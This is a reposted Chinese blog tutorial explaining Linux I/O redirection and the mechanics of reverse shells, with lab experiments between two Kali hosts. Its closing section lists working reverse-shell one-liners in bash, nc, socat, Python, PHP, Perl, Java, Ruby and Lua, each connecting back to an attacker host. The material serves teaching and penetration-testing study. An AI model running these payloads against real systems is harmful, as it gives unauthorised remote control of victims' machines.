<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>转载-浅析反弹shell原理与方法 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="0x01 前言做了白嫖怪很久了，对于反弹shell的方法，当然是google一下，百度一下就可以搞定的，找个小本本记下来，用的时候copy一下就可以的，当然也就不知其所以然了。  所以今天抽空总结一下linux反弹shell的原理，弄明白反弹的语句究竟在干什么！！！XD 0x02 数据流重定向概念先来复习下linux文件描述符的概念，其实文件描述符可以理解为linux跟踪打开文件，而分配的一个数字">
<meta property="og:type" content="article">
<meta property="og:title" content="转载-浅析反弹shell原理与方法">
<meta property="og:url" content="http://example.com/2021/11/25/first/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="0x01 前言做了白嫖怪很久了，对于反弹shell的方法，当然是google一下，百度一下就可以搞定的，找个小本本记下来，用的时候copy一下就可以的，当然也就不知其所以然了。  所以今天抽空总结一下linux反弹shell的原理，弄明白反弹的语句究竟在干什么！！！XD 0x02 数据流重定向概念先来复习下linux文件描述符的概念，其实文件描述符可以理解为linux跟踪打开文件，而分配的一个数字">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/22/oS8SIg.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/23/o9vxYQ.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/23/oCisrd.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/23/oCFfT1.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/23/oCkDHA.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oiOTuq.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFF9E9.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFFSHJ.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFF2VJ.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFFOIA.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFFzxf.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFkCqg.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFkBod.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFkhwQ.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFAfc6.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFAL9I.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFERaQ.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFETMV.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFV8ij.png">
<meta property="og:image" content="https://z3.ax1x.com/2021/11/24/oFVrFJ.png">
<meta property="article:published_time" content="2021-11-25T13:22:10.000Z">
<meta property="article:modified_time" content="2021-11-25T14:20:07.656Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Penetration test">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z3.ax1x.com/2021/11/22/oS8SIg.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-first" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/25/first/" class="article-date">
  <time class="dt-published" datetime="2021-11-25T13:22:10.000Z" itemprop="datePublished">2021-11-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Penetration-test-%E8%BD%AC%E8%BD%BD/">Penetration test 转载</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      转载-浅析反弹shell原理与方法
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>做了白嫖怪很久了，对于反弹shell的方法，当然是google一下，百度一下就可以搞定的，找个小本本记下来，用的时候copy一下就可以的，当然也就不知其所以然了。</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/22/oS8SIg.png"><img src="https://z3.ax1x.com/2021/11/22/oS8SIg.png" alt="oS8SIg.png"></a></p>
<p>所以今天抽空总结一下linux反弹shell的原理，弄明白反弹的语句究竟在干什么！！！XD</p>
<h1 id="0x02-数据流重定向"><a href="#0x02-数据流重定向" class="headerlink" title="0x02 数据流重定向"></a>0x02 数据流重定向</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>先来复习下linux文件描述符的概念，其实文件描述符可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，linux启动的时候会默认打开三个文件描述符：0,1,2，下面细细道来。</p>
<p>通常我们执行一个命令，流程如下图所示：</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/23/o9vxYQ.png"><img src="https://z3.ax1x.com/2021/11/23/o9vxYQ.png" alt="o9vxYQ.png"></a></p>
<p>我们运行一个命令，这个命令可能由文件读入数据，经过处理后将结果输出到屏幕上，结果有可能是标准输出或者标准错误输出。</p>
<p>标准输出指的是：命令运行所回传的正确的信息，而标准错误输出可理解为：命令运行失败后，所回传的错误信息。</p>
<p>不管正确错误的数据都被输出到屏幕上，所以我们可以通过重定向的方法将这两股数据分开，这样看起来就会比较有条理XD， 需要用到的重定向的特殊字符如下：</p>
<ol>
<li>标准输入　　(stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ；</li>
<li>标准输出　　(stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ；</li>
<li>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt; ；</li>
</ol>
<p><strong>Notes：bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后再把重定向去掉，执行指令</strong></p>
<h2 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">1&gt;或者&gt;</span><br></pre></td></tr></table></figure>

<p>这个概念很简单，也就是将数据输出到指定的文件中，直接看示例，<code>&gt;</code>和<code>&gt;&gt;</code>的区别就是覆盖和新增的区别，在此不再演示。</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/23/oCisrd.png"><img src="https://z3.ax1x.com/2021/11/23/oCisrd.png" alt="oCisrd.png"></a></p>
<p>输出流默认是1，修改了1的指向，将输出内容输出到文件exp1中。</p>
<h2 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">0&lt;或&lt;</span><br></pre></td></tr></table></figure>

<p>输入重新向即将需要的数据读入，不多bb直接看示例：</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/23/oCFfT1.png"><img src="https://z3.ax1x.com/2021/11/23/oCFfT1.png" alt="oCFfT1.png"></a></p>
<p><strong>Notes：这里的输入重定向和输出重定向一起使用，从左向右解析先检查重定向，首先是对exp2的输出重定向，接着是对exp1的输入重定向，那这个命令的目的就非常明显了：使用exp1作为cat的读取内容，并将其内容输出到exp2中，所以文件夹中生成了原来不存在的exp2文件，且内容与exp1一致。</strong></p>
<p>我们调换位置结果也是一样的：</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/23/oCkDHA.png"><img src="https://z3.ax1x.com/2021/11/23/oCkDHA.png" alt="oCkDHA.png"></a></p>
<h2 id="标准输出和错误输出重定向"><a href="#标准输出和错误输出重定向" class="headerlink" title="标准输出和错误输出重定向"></a>标准输出和错误输出重定向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">&amp;&gt; test或&gt;&amp; test</span><br></pre></td></tr></table></figure>

<p>这个也很好理解，就是正确和错误数据都输出到同一个地方去，</p>
<p><code>&amp;&gt;</code>和<code>&gt;&amp;</code>两种格式效果是完全相同的，且都等价于<code>&gt; test 2&gt;&amp;1</code>；</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oiOTuq.png"><img src="https://z3.ax1x.com/2021/11/24/oiOTuq.png" alt="oiOTuq.png"></a></p>
<p><strong>Notes：</strong></p>
<p><strong>1.这里<code>&gt; test 2&gt;&amp;1</code>中<code>2&gt;&amp;1</code>表示的是将标准错误复制到标准输出中，&amp;是为了区分开文件名为1的文件和文件描述符1。</strong></p>
<p><strong>2.<code>n&gt;&amp;m</code>和<code>n&lt;&amp;m</code>表示的都是将文件描述符n复制到m，只不过是分只写/读模式，对其结果没有任何影响</strong>。</p>
<p><strong>3.<code>cmd &gt; test 2&gt;&amp;1</code>和<code>cmd 2&gt;&amp;1 &gt; test</code>的区别是很大的，顺序对于重定向非常重要，bash从左向右依次执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">&gt; test 2&gt;&amp;1 先将标准输出指向test，再将标准错误输出指向标准输出，最终的结果是两个都指向test</span><br><span class="line"></span><br><span class="line">2&gt;&amp;1 &gt; test 先将标准错误输出指向标准输出，两者此时都指向/dev/tty，但是后面标准输出被指向到了test，所以结果是命令行输出error，test文件中显示标准输出</span><br></pre></td></tr></table></figure>

<p>所以综上所述，下面几条命令是等价的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">touch &amp;&gt; test</span><br><span class="line">touch &gt;&amp; test</span><br><span class="line">touch &gt; test 2&gt;&amp;1</span><br><span class="line">touch &gt; test 2&lt;&amp;1</span><br></pre></td></tr></table></figure>

<h1 id="0x03-Linux反弹shell"><a href="#0x03-Linux反弹shell" class="headerlink" title="0x03 Linux反弹shell"></a>0x03 Linux反弹shell</h1><h2 id="正向和反向的概念"><a href="#正向和反向的概念" class="headerlink" title="正向和反向的概念"></a>正向和反向的概念</h2><p>正向shell：8说了，ssh这种就是最典型的正向shell，客户端去连接服务端，就是正向shell；</p>
<p>反向shell：通过命令执行将被控端的shell发送到控制端的指定端口，服务端去返连客户端，这种shell就是反向shell。</p>
<h2 id="为什么要建立反向shell"><a href="#为什么要建立反向shell" class="headerlink" title="为什么要建立反向shell"></a>为什么要建立反向shell</h2><p>比较常规的方式是，如果有RCE或者可以拿下webshell有权限去开启这个主机的一些端口服务，比如telnet、ssh、RDP等，攻击者可以直接去连接这些端口来获得主机的控制权限。但是在有些情况下正向连接行不通。</p>
<ol>
<li>防火墙限制，被控主机只能发送请求，不能接收请求；</li>
<li>被控主机在局域网中，你无法直接连接；</li>
<li>被控主机IP动态变化，你无法控制………….</li>
</ol>
<p>所以在这些情况下一般都会反弹一个shell回来，这样做可以获得对受害者更稳定的控制。</p>
<h2 id="bash反弹shell的原理"><a href="#bash反弹shell的原理" class="headerlink" title="bash反弹shell的原理"></a>bash反弹shell的原理</h2><p>这部分我们分析下Linux的bash命令反弹shell的原理，结合上述数据重定向的内容，这里将会非常简单。</p>
<p>首先反弹的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">bash -i  &gt;&amp; /dev/tcp/你的公网主机IP/PORT 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>从左到右依次来看</p>
<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><ul>
<li><code>bash</code>就是linux一个常见的shell，类比sh和zsh等；</li>
<li><code>-i</code>这个参数表示的是产生一个交互式的shell。</li>
</ul>
<h3 id="dev-tcp-ip-port"><a href="#dev-tcp-ip-port" class="headerlink" title="/dev/tcp/ip/port"></a>/dev/tcp/ip/port</h3><p><code>/dev/tcp/ip/port</code>比较特殊，你会发现/dev目录下并没有tcp这个玩意~但是如果你在对方监听某个端口的情况下去对这个文件进行读写操作，就能够实现和对方监听端口的socket通信，8多说了，开冲。</p>
<blockquote>
<p>环境：</p>
<p>kali1:192.168.150.133</p>
<p>kali2:192.168.150.135</p>
</blockquote>
<p>1.kali1监听端口接收消息</p>
<p>kali2进行写操作</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFF9E9.png"><img src="https://z3.ax1x.com/2021/11/24/oFF9E9.png" alt="oFF9E9.png"></a></p>
<p>监听端口得到写入的数据</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFFSHJ.png"><img src="https://z3.ax1x.com/2021/11/24/oFFSHJ.png" alt="oFFSHJ.png"></a></p>
<p>2.kali1监听端口写入消息</p>
<p>kali1先监听1234端口，kali2将cat的输入重定向到kali1的1234端口</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFF2VJ.png"><img src="https://z3.ax1x.com/2021/11/24/oFF2VJ.png" alt="oFF2VJ.png"></a></p>
<p>kali1得到kali2的连接</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFFOIA.png"><img src="https://z3.ax1x.com/2021/11/24/oFFOIA.png" alt="oFFOIA.png"></a></p>
<p>kali1开始输入内容</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFFzxf.png"><img src="https://z3.ax1x.com/2021/11/24/oFFzxf.png" alt="oFFzxf.png"></a></p>
<p>kali2就会将其作为cat的输入重定向，将其内容打印出来</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFkCqg.png"><img src="https://z3.ax1x.com/2021/11/24/oFkCqg.png" alt="oFkCqg.png"></a></p>
<h3 id="gt-amp-和0-gt-amp-1"><a href="#gt-amp-和0-gt-amp-1" class="headerlink" title="&gt;&amp;和0&gt;&amp;1"></a>&gt;&amp;和0&gt;&amp;1</h3><p>将kali2作为被控端，kali1作为控制端，做一些小实验</p>
<p>一、先试试<code>bash -i &gt; /dev/tcp/192.168.150.133/1234</code>，标准输出重定向</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFkBod.png"><img src="https://z3.ax1x.com/2021/11/24/oFkBod.png" alt="oFkBod.png"></a></p>
<p>发现命令的标准输出都被重定向到了kali1的1234端口了，本地的shell不显示标准输出了XD</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFkhwQ.png"><img src="https://z3.ax1x.com/2021/11/24/oFkhwQ.png" alt="oFkhwQ.png"></a></p>
<p>这样的反弹shell显然是不行的，因为你不能输入命令让被控端执行命令，只能等待受害者自己执行命令，等待回显。</p>
<p>二、我们再试试<code>bash -i &lt; /dev/tcp/192.168.150.133/1234</code></p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFAfc6.png"><img src="https://z3.ax1x.com/2021/11/24/oFAfc6.png" alt="oFAfc6.png"></a></p>
<p>发现可以输入命令了，并且受害者主机也会执行，但是控制端没结果回显啊XD，所以还是缺了点什么</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFAL9I.png"><img src="https://z3.ax1x.com/2021/11/24/oFAL9I.png" alt="oFAL9I.png"></a></p>
<p>三、结合</p>
<p>其实上面第一个实验是没办法输入，第二个实验是没办法输出，只要将两个实验结合一下就可以达成输入和输出并存的目的了XD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">bash -i &gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>1.先将本地的标准输出流重定向到攻击机，保证命令输出结果可以回显</p>
<p>2.再将本地的标准输入流复制到标准输出流，也就是指向攻击机（有点像指针XD），保证可以在攻击机的特定端口发送命令</p>
<p>那就再试试：</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFERaQ.png"><img src="https://z3.ax1x.com/2021/11/24/oFERaQ.png" alt="oFERaQ.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFETMV.png"><img src="https://z3.ax1x.com/2021/11/24/oFETMV.png" alt="oFETMV.png"></a></p>
<p>其实这样大致已经达成目的了，可以做到命令输入以及正确结果的回显，但是如果遇到了标准错误输出就无法输出结果了，例如上面的最下面一列的命令<code>cat /etc/shadow</code>，报错permisson denied并没有在1234端口回显，而是在受害者的shell中回显，证明我们的目录中并没有对标准错误输出进行重定向。</p>
<p>所以我们可以添加上对标准错误的重定向：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">bash -i &gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这次我们成功将标准输入、标准输出和标准错误输出全部重定向到了kali1主机的1234端口</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFV8ij.png"><img src="https://z3.ax1x.com/2021/11/24/oFV8ij.png" alt="oFV8ij.png"></a></p>
<p>受害主机kali2的shell没有一丝输出</p>
<p><a target="_blank" rel="noopener" href="https://z3.ax1x.com/2021/11/24/oFVrFJ.png"><img src="https://z3.ax1x.com/2021/11/24/oFVrFJ.png" alt="oFVrFJ.png"></a></p>
<p>这最终的命令<code>bash -i &gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1 2&gt;&amp;1</code>也就是我们常用的反弹shell的命令，只不过我们平时为了看起来不那么累赘，将<code>&gt; file 2&gt;&amp;1</code>替换成了一样效果的<code>&amp;&gt;</code>,就变成了如下的反弹shell命令（其实这4个玩意效果都是一样的XD）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">bash -i &gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1 2&lt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.150.133/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>上次有一位同事说你如果把反弹shell中的0去掉就无法反弹成功了，现在终于弄明白了为什么了XD，这里的回答应该是“没了0，就无法将标准输入流复制到标准输出流中了，这里的0可不能省略哦”</p>
<h1 id="0x04-反弹shell方法总结"><a href="#0x04-反弹shell方法总结" class="headerlink" title="0x04 反弹shell方法总结"></a>0x04 反弹shell方法总结</h1><p>1.bash一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.41/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>2.nc反连端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">nc 192.168.31.174 8080 -t -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>3.socat一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345</span><br></pre></td></tr></table></figure>

<p>4.脚本反弹</p>
<p>4.1 python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<p>4.2 php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>4.3 perl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.31.41&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>4.4 java</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">JAVA</span><br><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4.5 ruby</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>

<p>4.6 Lua</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH</span><br><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>

<p>此外还有很多其他的反弹骚姿势，这里总结几种常用的备忘XD，希望以后能对反弹shell有更深刻的印象吧。</p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>参考了很多资料和博文弄懂了reverse shell的部分原理，在反弹shell的时候还有一些问题值得探讨：例如获取的shell没有交互性该如何处理等问题，以后有空再学习总结下吧（<del>以后有空=没空</del>）。</p>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p>1.《鸟哥的Linux私房菜》</p>
<p>2.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
<p>3.<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
<p>4.<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009724931">https://segmentfault.com/a/1190000009724931</a></p>
<p><strong>文章作者:</strong> <a href="mailto:undefined">Gard3nia</a></p>
<p><strong>文章链接:</strong> <a target="_blank" rel="noopener" href="https://gard3nia.github.io/2021/11/21/%E6%B5%85%E8%B0%88%E5%8F%8D%E5%BC%B9shell/">https://gard3nia.github.io/2021/11/21/%E6%B5%85%E8%B0%88%E5%8F%8D%E5%BC%B9shell/</a></p>
<p><strong>版权声明:</strong> 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a target="_blank" rel="noopener" href="https://gard3nia.github.io/">Gard3nia’s Blog</a>！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/11/25/first/" data-id="ckwezyuip0000a0ugbngeb4k4" data-title="转载-浅析反弹shell原理与方法" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Penetration-test/" rel="tag">Penetration test</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2021/11/21/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Penetration-test-%E8%BD%AC%E8%BD%BD/">Penetration test 转载</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-test/" rel="tag">Penetration test</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Penetration-test/" style="font-size: 10px;">Penetration test</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/25/first/">转载-浅析反弹shell原理与方法</a>
          </li>
        
          <li>
            <a href="/2021/11/21/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
